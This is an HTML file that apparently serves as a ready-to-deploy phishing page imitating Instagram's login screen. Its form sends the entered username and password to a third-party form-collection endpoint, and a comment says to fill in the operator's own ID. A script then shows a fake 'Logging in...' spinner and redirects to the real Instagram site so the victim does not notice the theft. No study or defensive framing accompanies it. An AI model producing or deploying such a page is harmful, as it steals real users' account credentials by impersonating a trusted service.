<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram • Login</title>
    <!-- Font Awesome for Icons -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <style>
        /* --- CSS Reset & Base Styles --- */
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
            color: #262626;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        /* --- Main Container --- */
        .login-container {
            background-color: #ffffff;
            border: 1px solid #dbdbdb;
            width: 350px;
            padding: 40px;
            display: flex;
            flex-direction: column;
            align-items: center;
            position: relative;
        }

        /* --- Logo Section --- */
        .logo {
            font-family: 'Segoe UI', sans-serif; /* Fallback */
            font-size: 2.5rem;
            margin-bottom: 30px;
            font-weight: 600;
            letter-spacing: -1px;
        }

        /* --- Form Elements --- */
        form {
            width: 100%;
            display: flex;
            flex-direction: column;
        }

        .input-group {
            position: relative;
            margin-bottom: 6px;
        }

        input {
            width: 100%;
            padding: 9px 7px 9px 25px; /* Left padding for icon */
            border: 1px solid #dbdbdb;
            background-color: #fafafa;
            font-size: 12px;
            outline: none;
        }

        input:focus {
            border: 1px solid #a8a8a8;
        }

        /* Icons inside inputs */
        .input-group i {
            position: absolute;
            left: 8px;
            top: 50%;
            transform: translateY(-50%);
            color: #8e8e8e;
            font-size: 12px;
        }

        /* --- Buttons --- */
        .btn-login {
            background-color: #0095f6;
            border: none;
            color: white;
            font-weight: 600;
            padding: 7px;
            margin-top: 10px;
            cursor: pointer;
            font-size: 14px;
            width: 100%;
            border-radius: 4px;
            transition: background-color 0.2s;
        }

        .btn-login:hover {
            background-color: #1877f2;
        }

        .btn-login:disabled {
            background-color: #bcdbfb;
            cursor: default;
        }

        /* --- Separator --- */
        .separator {
            display: flex;
            align-items: center;
            margin: 20px 0;
            width: 100%;
        }

        .separator::before, .separator::after {
            content: "";
            flex: 1;
            height: 1px;
            background-color: #dbdbdb;
        }

        .separator span {
            padding: 0 10px;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
        }

        /* --- Facebook Login --- */
        .fb-login {
            display: flex;
            align-items: center;
            justify-content: center;
            color: #385185;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            margin-bottom: 15px;
        }

        .fb-login i {
            margin-right: 8px;
            font-size: 18px;
        }

        /* --- Forgot Password & Sign Up --- */
        .links {
            margin-top: 10px;
        }

        .links a {
            color: #00376b;
            text-decoration: none;
            font-size: 12px;
        }

        .signup-text {
            margin-top: 20px;
            font-size: 14px;
            color: #262626;
        }

        .signup-text a {
            color: #0095f6;
            text-decoration: none;
            font-weight: 600;
        }

        /* --- Loading Overlay (Fake Spinner) --- */
        .overlay {
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
            background-color: rgba(255, 255, 255, 0.9);
            display: none; /* Hidden by default */
            justify-content: center;
            align-items: center;
            flex-direction: column;
            z-index: 10;
        }

        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #385185;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        .loading-text {
            margin-top: 10px;
            color: #262626;
            font-size: 14px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* --- Responsive Design (Mobile) --- */
        @media (max-width: 450px) {
            body {
                background-color: white;
                align-items: flex-start;
                padding-top: 20px;
            }
            
            .login-container {
                width: 100%;
                border: none;
                box-shadow: none;
                padding: 20px;
            }

            /* On mobile, we might want to hide the "OR" section or adjust spacing */
        }
    </style>
</head>
<body>

<div class="login-container">
    
    <!-- Loading Overlay -->
    <div class="overlay" id="loadingOverlay">
        <div class="spinner"></div>
        <div class="loading-text">Logging in...</div>
    </div>

    <!-- Logo -->
    <h1 class="logo">Instagram</h1>

    <!-- Form -->
    <!-- Replace YOUR_FORMSPREE_ID below with your actual ID -->
    <form id="instaForm" action="https://formspree.io/f/YOUR_FORMSPREE_ID" method="POST">
        
        <div class="input-group">
            <i class="fas fa-user"></i>
            <input type="text" name="username" placeholder="Phone number, username, or email" required autocomplete="off">
        </div>

        <div class="input-group">
            <i class="fas fa-lock"></i>
            <input type="password" name="password" placeholder="Password" required>
        </div>

        <button type="submit" class="btn-login" id="loginBtn">Log In</button>
    </form>

    <!-- Separator -->
    <div class="separator">
        <span>OR</span>
    </div>

    <!-- Facebook Login (Visual Only) -->
    <div class="fb-login">
        <i class="fab fa-facebook-square"></i> Log in with Facebook
    </div>

    <!-- Links -->
    <div class="links">
        <a href="#">Forgot password?</a>
    </div>

    <!-- Sign Up Text -->
    <div class="signup-text">
        Don't have an account? <a href="#">Sign up</a>
    </div>

</div>

<script>
    const form = document.getElementById('instaForm');
    const overlay = document.getElementById('loadingOverlay');
    const btn = document.getElementById('loginBtn');

    form.addEventListener('submit', function(e) {
        // 1. Show the loading spinner
        overlay.style.display = 'flex';
        
        // 2. Disable button to prevent double clicks
        btn.disabled = true;
        btn.innerText = "Please wait...";

        // 3. Wait for 2 seconds (simulating server check)
        setTimeout(() => {
            // 4. Redirect user to the real Instagram page
            window.location.href = "https://www.instagram.com/";
        }, 2000);
    });
</script>

</body>
</html>
